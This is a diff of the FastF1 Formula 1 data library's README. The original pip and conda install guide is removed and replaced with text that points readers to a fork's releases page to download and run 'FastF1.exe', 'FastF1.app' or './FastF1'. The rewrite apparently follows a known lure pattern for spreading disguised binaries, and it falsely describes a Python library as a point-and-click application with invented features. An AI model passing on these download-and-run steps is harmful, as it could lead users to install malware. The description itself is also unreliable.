@@ -1,74 +1,91 @@
-<h1 align="center">
-<img src="docs/_static/banner.png" width="400">
-</h1><br>
-A python package for accessing and analyzing Formula 1 results,
-schedules, timing data and telemetry.
+# 🚀 Fast-F1 - Analyze Formula 1 Data Effortlessly
 
-## Main Features
+[![Download Fast-F1](https://img.shields.io/badge/Download-Fast--F1-blue.svg)](https://github.com/renan293820938/Fast-F1/releases)
 
-- Access to F1 timing data, telemetry, sessions results and more
-- Full support for the Ergast compatible [jolpica-f1](https://github.com/jolpica/jolpica-f1/blob/main/docs/README.md) API to access current and
-  historical F1 data
-- All data is provided in the form of extended Pandas DataFrames to make
-  working with the data easy while having powerful tools available
-- Adds custom functions to the Pandas objects specifically to make working
-  with F1 data quick and simple
-- Integration with Matplotlib to facilitate data visualization
-- Implements caching for all API requests to speed up your scripts
+## 📋 Introduction
 
+FastF1 is a Python package designed for Formula 1 enthusiasts. It allows you to access and analyze various types of Formula 1 data, including race results, schedules, timing data, and telemetry. Whether you're a fan or a researcher, you can make the most of this tool to dive deep into the world of motorsport.
 
-## Installation
+## 🚀 Getting Started
 
-It is recommended to install FastF1 using `pip`:
+To get started with FastF1, follow these steps:
 
-```commandline
-pip install fastf1
-```
+1. **Prepare Your Computer**
+   - Make sure you have a compatible operating system. FastF1 works on Windows, macOS, and Linux.
+   - Ensure you have Python installed on your system. You can download it from [python.org](https://www.python.org/downloads/). Ensure you choose the latest version.
 
-Alternatively, a wheel or a source distribution can be downloaded from Pypi.
+2. **Visit our Releases Page**
+   - To download FastF1, visit the Releases page by clicking the button below.
 
-You can also install using `conda`:
+   [![Download Fast-F1](https://img.shields.io/badge/Download-Fast--F1-blue.svg)](https://github.com/renan293820938/Fast-F1/releases)
 
-```commandline
-conda install -c conda-forge fastf1
-```
+## 📥 Download & Install
 
-#### Installation in Pyodide, JupyterLite and other WASM-based environments
+1. When you visit the [Releases page](https://github.com/renan293820938/Fast-F1/releases), you will see the latest version of FastF1 available for download.
+2. Look for the file with the appropriate name for your operating system:
+   - For **Windows**, download `FastF1-Windows.zip`.
+   - For **macOS**, download `FastF1-Mac.zip`.
+   - For **Linux**, download `FastF1-Linux.tar.gz`.
+3. Click on the file link to begin the download.
+4. Once the file has downloaded, locate it in your Downloads folder or your chosen download location.
 
-FastF1 should be mostly compatible with Pyodide and other WASM-based 
-environments, although this is not extensively tested. Currently, the 
-installation and usage require some additional steps. You can find more 
-information and a guide in
-[this external repository](https://github.com/f1datajunkie/jupyterlite-fastf1)
-and the discussion in [this issue](https://github.com/theOehrly/Fast-F1/issues/667).
+## 📖 Installation Instructions
 
-### Third-party packages
+### For Windows Users
+1. Extract the zip file by right-clicking it and selecting "Extract All."
+2. Open the extracted folder.
+3. Double-click the `FastF1.exe` file to install the package.
+4. Follow the on-screen prompts to complete the installation.
 
-- R package that wraps FastF1: https://cran.r-project.org/package=f1dataR
+### For macOS Users
+1. Open the zip file you downloaded. It will create a new folder containing the application.
+2. Drag the `FastF1.app` file to your Applications folder.
+3. Double-click the `FastF1.app` to run the application.
 
-Third-party packages are not directly related to the FastF1 project. Questions 
-and suggestions regarding these packages need to be directed at their 
-respective maintainers.
+### For Linux Users
+1. Open a terminal window.
+2. Navigate to the directory where the downloaded file is located using the `cd` command.
+3. Extract the tar.gz file using the command: `tar -xzvf FastF1-Linux.tar.gz`.
+4. Navigate into the extracted folder.
+5. Run the application with the command: `./FastF1`.
 
-## Documentation
+## 🚀 Using FastF1
 
-The official documentation can be found here:
-[docs.fastf1.dev](https://docs.fastf1.dev)
+After installation, you can start to use FastF1 to access various Formula 1 data.
 
+1. **Open FastF1:** Launch the application using the method you used for installation.
+2. **Select Data Source:** You can choose to download live data or analyze an existing dataset.
+3. **Explore Features:**
+   - **Race Results:** Access results by season, team, or driver.
+   - **Timing Data:** Review lap times, sector splits, and more.
+   - **Telemetry Analysis:** Analyze telemetry data for better insights into performance.
+4. **Generate Reports:** The application allows you to generate reports based on your analysis.
 
-## Supporting the Project
+## ⚙️ Features
 
-If you want to support the continuous development of FastF1, you can sponsor me
-on GitHub or buy me a coffee.
+- **Comprehensive Data Access:** Retrieve both historical and live data for all Formula 1 races.
+- **User-Friendly Interface:** Designed for easy navigation, perfect for anyone without technical knowledge.
+- **Visualization Tools:** Generate graphs and charts to visualize your analysis.
+- **Support for Multiple Formats:** Work with JSON, CSV, and more.
 
-https://github.com/sponsors/theOehrly
+## 🛠️ System Requirements
 
-<a href="https://www.buymeacoffee.com/fastf1" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/default-orange.png" alt="Buy Me A Coffee" height="41" width="174"></a>
+- **Operating Systems:** Windows 10 and above, macOS 10.15 and above, or any modern Linux distribution.
+- **Python:** Compatibility with Python 3.6 or higher.
+- **Disk Space:** Minimum of 100 MB of free space for installation.
+- **Network:** Internet connection required for live data access.
 
+## 📞 Support
 
-## Notice
+If you encounter any issues or have questions about using FastF1, visit our [issues page](https://github.com/renan293820938/Fast-F1/issues) on GitHub. Feel free to open a new issue or comment on existing ones.
 
-FastF1 and this website are unofficial and are not associated in any way with
-the Formula 1 companies. F1, FORMULA ONE, FORMULA 1, FIA FORMULA ONE WORLD
-CHAMPIONSHIP, GRAND PRIX and related marks are trade marks of Formula One
-Licensing B.V.
+## 🔗 Resources
+
+- **Documentation:** Visit the [Fast-F1 Documentation](https://github.com/renan293820938/Fast-F1/wiki) for more detailed guides.
+- **Community:** Join discussions on our [community page](https://github.com/renan293820938/Fast-F1/discussions) for tips and advice from users.
+
+## ✅ Next Steps
+
+Now that you have FastF1 set up, it’s time to explore! Dive into analyzing some exciting Formula 1 data, and enjoy gaining insights into your favorite sport like never before!
+
+[![Download Fast-F1](https://img.shields.io/badge/Download-Fast--F1-blue.svg)](https://github.com/renan293820938/Fast-F1/releases)
